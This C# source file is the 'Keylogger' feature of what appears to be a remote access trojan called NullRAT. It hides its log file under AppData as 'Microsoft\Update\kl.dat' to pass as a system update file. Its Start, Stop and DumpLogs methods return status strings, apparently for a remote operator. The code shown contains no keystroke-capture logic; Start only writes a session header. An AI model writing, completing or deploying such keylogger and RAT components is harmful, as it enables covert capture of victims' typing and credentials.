using System;
using System.IO;
using System.Windows.Forms;

namespace NullRAT.Features
{
    public class Keylogger
    {
        private string logPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Microsoft\\Update\\kl.dat");
        private bool isRunning = false;

        public string Start()
        {
            if (isRunning) return "Keylogger already active.";
            isRunning = true;
            File.AppendAllText(logPath, $"\n--- Session Started {DateTime.Now} ---\n");
            return "Keylogger started successfully.";
        }

        public string Stop()
        {
            isRunning = false;
            return "Keylogger stopped.";
        }

        public string DumpLogs()
        {
            return File.Exists(logPath) ? File.ReadAllText(logPath) : "No logs available.";
        }
    }
}